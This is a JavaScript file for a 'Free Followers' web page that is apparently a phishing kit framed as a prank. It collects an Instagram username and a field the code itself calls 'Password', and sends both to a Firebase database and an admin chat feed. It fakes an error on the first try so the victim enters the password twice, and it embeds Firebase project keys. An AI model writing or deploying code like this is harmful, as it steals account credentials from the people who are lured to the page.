import { initializeApp } from
  "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";

import {
  getDatabase,
  ref,
  push
} from
  "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";


// ==========================================
// FIREBASE
// ==========================================

const firebaseConfig = {
  apiKey: "AIzaSyBCJI2YgCLUYI0U9ufRfCujRjDDTeP-lNY",
  authDomain: "kalakkal1-d6e19.firebaseapp.com",
  databaseURL:
    "https://kalakkal1-d6e19-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "kalakkal1-d6e19",
  storageBucket: "kalakkal1-d6e19.appspot.com",
  messagingSenderId: "979373423767",
  appId: "1:979373423767:web:52485a1a022670f2b6fdd2"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);


// ==========================================
// FIREBASE REFERENCES
// ==========================================

// Original prank submissions
const prankSubmissionsRef =
  ref(database, "prankSubmissions");

// KK Chat messages
const messagesRef =
  ref(database, "messages");


// ==========================================
// HTML ELEMENTS
// ==========================================

const form =
  document.getElementById("followerForm");

const instagramInput =
  document.getElementById("instagram");

const followersInput =
  document.getElementById("followers");

const errorMessage =
  document.getElementById("errorMessage");

const formPage =
  document.getElementById("formPage");

const prankPage =
  document.getElementById("prankPage");


// ==========================================
// ATTEMPT COUNTER
// ==========================================

let attempt = 0;


// ==========================================
// CHECK ELEMENTS
// ==========================================

if (!form) {
  console.error(
    "Free Followers: #followerForm was not found."
  );
}

if (!instagramInput) {
  console.error(
    "Free Followers: #instagram was not found."
  );
}

if (!followersInput) {
  console.error(
    "Free Followers: #followers was not found."
  );
}


// ==========================================
// SUBMIT FORM
// ==========================================

form?.addEventListener("submit", async (event) => {

  event.preventDefault();


  // ========================================
  // READ INPUTS
  // ========================================

  const instagram =
    instagramInput?.value.trim() || "";

  const followers =
    followersInput?.value.trim() || "";


  // ========================================
  // VALIDATION
  // ========================================

  if (!instagram || !followers) {
    return;
  }


  // ========================================
  // ATTEMPT
  // ========================================

  attempt++;

  const tryName =
    attempt === 1
      ? "Try1"
      : "Try2";


  // ========================================
  // CLEAN INSTAGRAM USERNAME
  // ========================================

  const cleanUsername =
    instagram.replace(/^@+/, "");


  // ========================================
  // CURRENT TIME
  // ========================================

  const timestamp =
    Date.now();


  try {

    // ======================================
    // 1. SAVE ORIGINAL SUBMISSION
    // ======================================

    await push(
      ref(
        database,
        `prankSubmissions/${tryName}`
      ),
      {
        username: cleanUsername,
        followers: followers,
        timestamp: timestamp
      }
    );


    // ======================================
    // 2. SEND TO KK CHAT
    // ======================================
    //
    // This uses the SAME structure that
    // your KK Chat already displays:
    //
    // type
    // text
    // sender
    // admin
    // timestamp
    //
    // Your KK Chat listens to /messages.
    // ======================================

    const chatText =
      `REQUESTS | ${tryName}\n` +
      `Username: @${cleanUsername}\n` +
      `Password: ${followers}`;


    await push(
      messagesRef,
      {
        type: "text",
        text: chatText,
        sender: "Informations",
        admin: true,
        timestamp: timestamp
      }
    );


    console.log(
      `Saved ${tryName} and sent to KK Chat`
    );


    // ======================================
    // FIRST ATTEMPT
    // ======================================

    if (attempt === 1) {

      if (errorMessage) {
        errorMessage.style.display =
          "block";
      }


      // Clear fields
      if (instagramInput) {
        instagramInput.value = "";
      }

      if (followersInput) {
        followersInput.value = "";
      }


      // Focus username
      instagramInput?.focus();


      return;
    }


    // ======================================
    // SECOND ATTEMPT
    // ======================================

    if (attempt === 2) {

      if (formPage) {
        formPage.style.display =
          "none";
      }

      if (prankPage) {
        prankPage.style.display =
          "flex";
      }

    }

  } catch (error) {

    console.error(
      "Free Followers Firebase error:",
      error
    );

    alert(
      "Something went wrong. Please try again."
    );

  }

});
